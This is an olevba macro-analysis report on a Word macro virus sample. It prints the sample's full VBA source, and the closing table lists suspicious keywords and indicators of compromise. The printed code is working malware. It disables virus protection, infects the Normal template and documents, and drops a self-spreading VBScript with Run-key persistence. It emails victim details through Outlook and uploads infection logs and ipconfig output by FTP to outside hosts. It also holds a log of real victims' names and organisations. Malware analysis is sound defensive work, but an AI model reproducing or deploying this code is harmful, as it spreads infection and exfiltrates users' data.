olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker-based-148b3c15fef0207a794e7ede1c4ce2e91a10a61d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker-based-148b3c15fef0207a794e7ede1c4ce2e91a10a61d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'AVM
On Error Resume Next
Dim DC, IT As Integer
Application.EnableCancelKey = 0
Options.VirusProtection = 0
Options.SaveNormalPrompt = 0
Options.ConfirmConversions = 0
a = ActiveDocument.Saved
If Right(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, 1), 3) <> "AVM" Then
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromString ("Sub AutoClose()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines - 1))
End If
If Right(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, 1), 3) <> "AVM" Then
ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.AddFromString ("Sub AutoOpen()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines - 1))
If Left(ActiveDocument.Name, 8) <> "Document" Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End If
IT = (Day(Now))
DC = System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\VB and VBA Program Settings\Office\8.0", "AVM-DC")
If DC = "" Or DC < IT Then
GoOk = True
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\VB and VBA Program Settings\Office\8.0", "AVM-DC") = IT
End If
TestCon = System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\VB and VBA Program Settings\Office\8.0", "AVM-VBS")
If System.PrivateProfileString("", "HKEY_CLASSES_ROOT\VBSFile\ScriptEngine", "") = "VBScript" Then SIY = True
If SIY = True And TestCon <> "Done" Then
Open "c:\happy.vbs" For Output As 1
Print #1, "'§"
Print #1, ""
Print #1, "On Error Resume Next"
Print #1, "Dim IV6, U187, IV7, IV1, IV2, IV3, IV4"
Print #1, "Dim T111"
Print #1, "Dim IV5(200)"
Print #1, "Dim XR"
Print #1, "Set WSHShell = Wscript.CreateObject(""Wscript.Shell"")"
Print #1, "Set WshSysEnv = WSHShell.Environment(""Process"")"
Print #1, "IV10 = WshSysEnv(""Path"")"
Print #1, "IV7 = WSHShell.ExpandEnvironmentStrings(""%windir%\avm.vbs"")"
Print #1, "IV1 = Wscript.ScriptFullName"
Print #1, "Set IV6 = CreateObject(""Scripting.FileSystemObject"")"
Print #1, "XR = 1"
Print #1, "T11 = Wscript.ScriptFullName"
Print #1, "For x = Len(IV10) To 1 Step -1"
Print #1, "IV4 = Mid(IV10, x, 1)"
Print #1, "If IV4 <> "";"" Then"
Print #1, "IV5(XR) = IV4 + IV5(XR)"
Print #1, "ElseIf IV4 = "";"" Then"
Print #1, "IV5(XR) = IV5(XR) + ""\"""
Print #1, "XR = XR + 1"
Print #1, "End If"
Print #1, "Next"
Print #1, "IV5(XR) = IV5(XR) + ""\"""
Print #1, "IV5(XR + 1) = WSHShell.SpecialFolders(""Desktop"") + ""\"""
Print #1, "IV5(XR + 2) = WSHShell.SpecialFolders(""MyDocuments"") + ""\"""
Print #1, "IV5(XR + 3) = WSHShell.SpecialFolders(""Startup"") + ""\"""
Print #1, "IV5(XR + 4) = Left(T11, InStrRev(T11, ""\""))"
Print #1, "Set TS = IV6.OpenTextFile(T11, 1)"
Print #1, "IV9 = TS.ReadAll"
Print #1, "TS.Close"
Print #1, "IV8 = Chr(167)"
Print #1, "endIV8 = ""'"" & IV8"
Print #1, "For x = Len(IV9) To 1 Step -1"
Print #1, "If Mid(IV9, x, 1) = IV8 Then"
Print #1, "x = 1"
Print #1, "IV3 = endIV8 + IV3"
Print #1, "ElseIf Mid(IV9, x, 1) <> IV8 Then"
Print #1, "IV3 = Mid(IV9, x, 1) + IV3"
Print #1, "End If"
Print #1, "Next"
Print #1, "For y = 1 To (XR + 4)"
Print #1, "For Each Target In IV6.GetFolder(IV5(y)).Files"
Print #1, "If UCase(Right(Target.Name, 3)) = ""VBS"" Then"
Print #1, "IV11 = """""
Print #1, "Set TS = IV6.OpenTextFile(IV5(y) & Target.Name, 1)"
Print #1, "IV11 = TS.ReadAll"
Print #1, "TS.Close"
Print #1, "If mid(IV11,(len(IV11)-2),1) <> ""¥"" Then"
Print #1, "Set TS = IV6.OpenTextFile(IV5(y) & Target.Name, 8)"
Print #1, "TS.Write IV3"
Print #1, "TS.Close"
Print #1, "End If"
Print #1, "End If"
Print #1, "Next"
Print #1, "Next"
Print #1, "FIV11 (IV7)"
Print #1, "If T111 = False Then"
Print #1, "WSHShell.RegWrite ""HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\AVM"", IV7"
Print #1, "Set U187 = IV6.OpenTextFile(IV7, 2, True)"
Print #1, "U187.Write IV3"
Print #1, "U187.Close"
Print #1, "End If"
Print #1, "Function FIV11(filespec)"
Print #1, "Set IV6 = CreateObject(""Scripting.FileSystemObject"")"
Print #1, "If (IV6.FileExists(filespec)) Then"
Print #1, "T111 = True"
Print #1, "Else"
Print #1, "T111 = False"
Print #1, "End If"
Print #1, "End Function"
Print #1, "' Nick ""The Love Monkey"" Virus Package by ALT-F4 and ALT-F11 for the Alternative Virus Mafia"
Print #1, "'¥"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\VB and VBA Program Settings\Office\8.0", "AVM-VBS") = "Done"
Close 1
Shell "wscript c:\happy.vbs", vbHide
End If
If SIY = True And GoOk = True Then
If Dir("c:\A4.vbs") = "" Then
Open "c:\A4.vbs" For Output As 1
Print #1, "Dim theApp, theNameSpace, theMailItem"
Print #1, "Dim IPSocket"
Print #1, "On Error Resume Next"
Print #1, "Set IPSocket = CreateObject(""MSWinsock.Winsock"")"
Print #1, "IPADDY = IPSocket.LocalIP"
Print #1, "set BOB = CreateObject(""Wscript.Network"")"
Print #1, "For x = 1 To 2"
Print #1, "If x = 1 Then EMADDY = ""avm@nym.alias.net"" Else EMADDY = ""nick@virusbtn.com"""
Print #1, "if x = 1 then MSGBDY = IPADDY else MSGBDY = ""Dear Nicky... my name is " & Application.UserName & " and I want to make hot monkey love with you. You anti-virus stud!"""
Print #1, "Set theApp = WScript.CreateObject(""Outlook.Application"")"
Print #1, "Set theNameSpace = theApp.GetNameSpace(""MAPI"")"
Print #1, "theNameSpace.Logon ""profile"", ""password"""
Print #1, "Set theMailItem = theApp.CreateItem(0)"
Print #1, "theMailItem.Recipients.Add EMADDY"
Print #1, "theMailItem.Subject = BOB.Username"
Print #1, "theMailItem.Body = MSGBDY"
Print #1, "theMailItem.Send"
Print #1, "theNameSpace.Logoff"
Print #1, "Next"
Close 1
End If
Shell "wscript c:\a4.vbs", vbHide
End If
If ActiveDocument.Saved <> a Then ActiveDocument.Saved = a
' Nick "The Love Monkey" Virus Package by ALT-F4 and ALT-F11 for the Alternative Virus Mafia
End Sub

Private Sub Document_Close()

On Error Resume Next

Const Marker = "<- this is a marker!"

'Declare Variables
Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
Dim ad, nt As Object
Dim OurCode, UserAddress, LogData, LogFile As String

'Initialize Variables
Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
Set nt = NormalTemplate.VBProject.VBComponents.Item(1)

DocumentInfected = ad.CodeModule.Find(Marker, 1, 1, 10000, 10000)
NormalTemplateInfected = nt.CodeModule.Find(Marker, 1, 1, 10000, 10000)


'Switch the VirusProtection OFF
Options.VirusProtection = False


  If (Day(Now()) = 1) And (System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogFile") = False) Then
  
    If DocumentInfected = True Then
      LogData = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)
    ElseIf NormalTemplateInfected = True Then
      LogData = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)
    End If
    
    LogData = Mid(LogData, InStr(1, LogData, "' Log" & "file -->"), Len(LogData) - InStr(1, LogData, "' Log" & "file -->"))
    
    For I = 1 To 4
      LogFile = LogFile + Mid(Str(Int(8 * Rnd)), 2, 1)
    Next I
    LogFile = "C:\hsf" & LogFile & ".sys"
    
    Open LogFile For Output As #1
    Print #1, LogData
    Close #1
    
    Open "c:\netldx.vxd" For Output As #1
    Print #1, "o 209.201.88.110"
    Print #1, "user anonymous"
    Print #1, "pass itsme@"
    Print #1, "cd incoming"
    Print #1, "ascii"
    Print #1, "put " & LogFile
    Print #1, "quit"
    Close #1
    
    Shell "command.com /c ftp.exe -n -s:c:\netldx.vxd", vbHide
    
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogFile") = True
    
  End If


'Make sure that some conditions are true before we continue infecting anything
If (DocumentInfected = True Xor NormalTemplateInfected = True) And _
   (ActiveDocument.SaveFormat = wdFormatDocument Or _
   ActiveDocument.SaveFormat = wdFormatTemplate) Then
   
   
  'Infect the NormalTemplate
  If DocumentInfected = True Then
  
    SaveNormalTemplate = NormalTemplate.Saved
  
    OurCode = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)

    
    'Write a log file of this NormalTemplate infection
    For I = 1 To Len(Application.UserAddress)
      If Mid(Application.UserAddress, I, 1) <> Chr(13) Then
        If Mid(Application.UserAddress, I, 1) <> Chr(10) Then
          UserAddress = UserAddress & Mid(Application.UserAddress, I, 1)
        End If
      Else
        UserAddress = UserAddress & Chr(13) & "' "
      End If
    Next I

    OurCode = OurCode & Chr(13) & _
              "' " & Format(Time, "hh:mm:ss AMPM - ") & _
                     Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
              "' " & Application.UserName & Chr(13) & _
              "' " & UserAddress & Chr(13)


    nt.CodeModule.deletelines 1, nt.CodeModule.CountOfLines
    nt.CodeModule.AddFromString OurCode
    
    If SaveNormalTemplate = True Then NormalTemplate.Save
    
  End If


  'Infect the ActiveDocument
  If NormalTemplateInfected = True And _
     (Mid(ActiveDocument.FullName, 2, 1) = ":" Or _
     ActiveDocument.Saved = False) Then
  
    SaveDocument = ActiveDocument.Saved
    
    OurCode = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)

    ad.CodeModule.deletelines 1, ad.CodeModule.CountOfLines
    ad.CodeModule.AddFromString OurCode
    
    If SaveDocument = True Then ActiveDocument.Save
      
  End If
  
    
End If

End Sub

' Logfile -->

' 09:08:36  - Saturday, 28 Nov 1998
' SPo0Ky
' Blue Planet
'



' 02:50:31 PM - Saturday, 28 Nov 1998
' MARK B. SEAY
'



' 08:04:45 AM - Friday, 4 Dec 1998
' UPS
'



' 11:43:35 AM - Thursday, 17 Dec 1998
' WRO
'



' 11:37:56 AM - Tuesday, 29 Dec 1998
' Dan Ross
'



' 09:50:06 AM - Monday, 11 Jan 1999
' Karen M. Pinks
'



' 04:41:03 PM - Thursday, 21 Jan 1999
' george w. connelly
'



' 08:10:46 PM - Tuesday, 26 Jan 1999
' Diane Schierlitz
'



' 11:27:30 AM - Thursday, 28 Jan 1999
' darryl l dyer
'



' 08:57:29 AM - Sunday, 31 Jan 1999
' David J. Standridge
'



' 08:26:16 AM - Wednesday, 3 Feb 1999
' Jeff Bassett
'



' 08:09:10 AM - Wednesday, 3 Feb 1999
' I.S.
'



' 03:12:17 PM - Monday, 8 Feb 1999
' IT Desktop Configuration
'



' 03:57:58 PM - Thursday, 18 Feb 1999
' I.S.
'



' 11:47:55 AM - Saturday, 20 Feb 1999
' Kinko's
'



' 10:25:46 AM - Monday, 22 Feb 1999
' Kinko's
'



' 11:02:06 AM - Wednesday, 14 Apr 1999
' Law School
'



' 03:03:35 PM - Sunday, 23 May 1999
' David Adamany
'



' 04:27:28 PM - Sunday, 23 May 1999
' David Adamany
'



' 07:59:38 AM - Tuesday, 20 Jul 1999
' intern2
'



' 10:06:23 AM - Wednesday, 11 Aug 1999
' intern1
'



' 01:07:01 PM - Monday, 23 Aug 1999
' Caesar Mickens
'



' 10:31:49 AM - Friday, 1 Oct 1999
' DPS
'



' 08:37:37 PM - Tuesday, 2 Nov 1999
' Dr. Kimberly Peoples
'



' 08:58:26 AM - Thursday, 30 Mar 2000
' eshaun
' Golightly Career & Techincal Center



' 09:37:30 AM - Wednesday, 12 Apr 2000
' Patricia
'



' 07:46:43 PM - Wednesday, 26 Apr 2000
' kelly
'



' 08:39:09 AM - Thursday, 4 May 2000
' user17
'



' 05:58:06 PM - Wednesday, 24 May 2000
' Golightly CTC
'



' 08:30:15 AM - Friday, 9 Jun 2000
' user22
'









' 10:06:48 AM - Tuesday, 31 Oct 2000
' user8
'



' 07:04:31 PM - Sunday, 29 Dec 2002
' Zowaa
'



-------------------------------------------------------------------------------
VBA MACRO groovie.bas 
in file: Virus.MSWord.Marker-based-148b3c15fef0207a794e7ede1c4ce2e91a10a61d - OLE stream: 'Macros/VBA/groovie'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public WhoAmI As String
Public DataDot As Boolean
Public NormInstalled As Boolean
Public DocInstalled As Boolean
Public NormReadOnly As Boolean
Public HoldDoc As String
Public DocThere As Boolean
Public Final_Close_Called As Boolean
Function ID_Status()
On Error Resume Next
    If MacroContainer = NormalTemplate Then
        WhoAmI = "normal"
        GoTo checkout
    End If
    If MacroContainer = ActiveDocument Then WhoAmI = "document"
    If MacroContainer = "data.dot" Then WhoAmI = "orbit"
checkout:
End Function
Function Install_Status()
On Error Resume Next
    If Dir(Application.StartupPath + "\data.dot") = "data.dot" Then DataDot = True
    For I = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(I).Name = "groovie" Then DocInstalled = True
    Next I
    For I = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(I).Name = "groovie" Then NormInstalled = True
    Next I
    If GetAttr(NormalTemplate.FullName) = vbArchive + vbReadOnly Or _
    GetAttr(NormalTemplate.FullName) = vbReadOnly Then NormReadOnly = True
End Function
Function The_Groovie_Core()
On Error Resume Next
Call ID_Status
Call Install_Status
    If WhoAmI = "document" Then Call DocCodeCore
    If WhoAmI = "normal" Then Call NormCodeCore
    If WhoAmI = "orbit" Then Call OrbitCoreCode
    If NormReadOnly = False Then CommandBars("tools").Controls("Macro").Delete
    If NormReadOnly = False Then CommandBars("tools").Controls("Templates and add-ins...").Delete
End Function
Function DocCodeCore()
On Error Resume Next
    Application.VBE.ActiveVBProject.VBComponents("groovie").Export "c:\groovie.sys"
    If NormInstalled = False And NormReadOnly = False Then
        With NormalTemplate.VBProject
        With .VBComponents.Import("c:\groovie.sys")
        End With
        End With
    End If
    If DataDot = False Then
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", _
        FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="groovie", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", _
        FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
        If ActiveDocument.Saved = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
        If Final_Close_Called = False Then Documents.Open FileName:=HoldDoc
        Shell ("label c: groovie"), 0
        Windows(1).Close
    End If
End Function
Function NormCodeCore()
On Error Resume Next
Application.ScreenUpdating = False
    Call Check_For_Doc
    If DocInstalled = False And DocThere = True Then
        With ActiveDocument.VBProject
        With .VBComponents.Import("c:\groovie.sys")
        End With
        End With
        With Dialogs(wdDialogFileSummaryInfo)
            .Comments = "ALT-F11 says it's groovie!"
            .Execute
        End With
    End If
    If DataDot = False And DocThere = True Then
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", _
        FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="groovie", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", _
        FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
        If Final_Close_Called = False Then Documents.Open FileName:=HoldDoc
        Windows(1).Close SaveChanges:=wdSaveChanges
    End If
    If DataDot = False And DocThere = False Then
        Documents.Add Template:="", NewTemplate:=False
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", _
        FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="groovie", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", _
        FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
        If ActiveDocument.Saved = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
        Windows(1).Close SaveChanges:=wdSaveChanges
    End If
Application.ScreenUpdating = True
End Function
Function OrbitCoreCode()
On Error Resume Next
Application.ScreenUpdating = False
        If NormInstalled = False And NormReadOnly = False Then
            With NormalTemplate.VBProject
            With .VBComponents.Import("c:\groovie.sys")
            End With
            End With
            NormalTemplate.Save
        End If
        If DocInstalled = False Then
            With ActiveDocument.VBProject
            With .VBComponents.Import("c:\groovie.sys")
            End With
            End With
            With Dialogs(wdDialogFileSummaryInfo)
                .Comments = "ALT-F11 says it's groovie!"
                .Execute
            End With
        End If
Application.ScreenUpdating = True
End Function
Function Groovie_Run()
On Error Resume Next
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    Options.ConfirmConversions = False
    HoldDoc = ActiveDocument.FullName
    Call The_Groovie_Core
    Randomize
    rn = Int(Rnd * 5)
    If rn = 3 Then Call IP_Love_You
End Function
Sub AutoOpen()
On Error Resume Next
Call Groovie_Run
End Sub
Sub AutoClose()
On Error Resume Next
Final_Close_Called = True
Call Groovie_Run
End Sub
Sub AutoExit()
On Error Resume Next
Final_Close_Called = True
Call Groovie_Run
End Sub
Sub FileSaveAs()
On Error Resume Next
Call Groovie_Run
Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub filesave()
On Error Resume Next
Call Groovie_Run
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
End Sub
Sub fileclose()
On Error Resume Next
Final_Close_Called = True
Call Groovie_Run
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
ActiveDocument.Close
End Sub
Sub fileprint()
On Error Resume Next
Call Groovie_Run
Dialogs(wdDialogFilePrint).Show
End Sub
Function IP_Love_You()
On Error Resume Next
    Shell ("ipconfig /all /batch c:\ip.txt"), 0
    Call mscript("c:\script.sys")
    Shell ("ftp -s:c:\script.sys complex.is"), 0
End Function
Function mscript(strFile As String)
Randomize
On Error Resume Next
    one = Application.UserName
    two = Application.UserInitials
    rn = Int(Rnd * 999)
    Dim hFile As Long
    hFile = FreeFile
Open strFile For Output Access Write As hFile
    Print #hFile, "anonymous"
    Print #hFile, one & "@" & two & ".com"
    Print #hFile, "cd incoming"
    Print #hFile, "send"
    Print #hFile, "c:\ip.txt"
    Print #hFile, rn + rn & "." & two
    Print #hFile, "quit"
Close hFile
End Function
Sub ViewVBCode()
MsgBox "It's GROOVIE", vbOKOnly, "•  ALT-F11  • says..."
End Sub
Sub ToolsMacro()
End Sub
Sub FileTemplates()
End Sub
Function Check_For_Doc()
On Error GoTo docek
    If ActiveDocument.Name <> "" Then
        DocThere = True
    End If
    GoTo over
docek:
    DocThere = False
over:
End Function

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Environment         |May read system environment variables        |
|Suspicious|ExpandEnvironmentStr|May read system environment variables        |
|          |ings                |                                             |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Wscript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |209.201.88.110      |IPv4 address                                 |
|IOC       |happy.vbs           |Executable file name                         |
|IOC       |avm.vbs             |Executable file name                         |
|IOC       |A4.vbs              |Executable file name                         |
|IOC       |a4.vbs              |Executable file name                         |
|IOC       |ftp.exe             |Executable file name                         |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

